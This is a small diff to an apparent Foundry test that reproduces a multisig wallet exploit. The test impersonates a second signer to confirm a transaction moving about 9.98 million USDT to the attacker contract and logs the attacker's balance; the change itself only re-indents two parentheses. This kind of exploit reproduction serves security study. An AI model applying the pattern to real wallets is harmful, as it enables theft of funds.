@@ -39,12 +39,12 @@ contract ContractTest is DSTest {
 
         emit log_named_address(
             "2 of 5 multisig wallet, transaction first signed by:", MultiSigWallet.getConfirmations(txId)[0]
-            );
+        );
         cheat.prank(0x812d8622C6F3c45959439e7ede3C580dA06f8f25);
         MultiSigWallet.confirmTransaction(txId); // Transfer 9,981,000 USDT to address(this)
         emit log_named_address(
             "2 of 5 multisig wallet, transaction second signed by:", MultiSigWallet.getConfirmations(txId)[1]
-            );
+        );
         emit log_named_uint("USDT balance of attacker after Exploit", usdt.balanceOf(address(this)));
     }
 
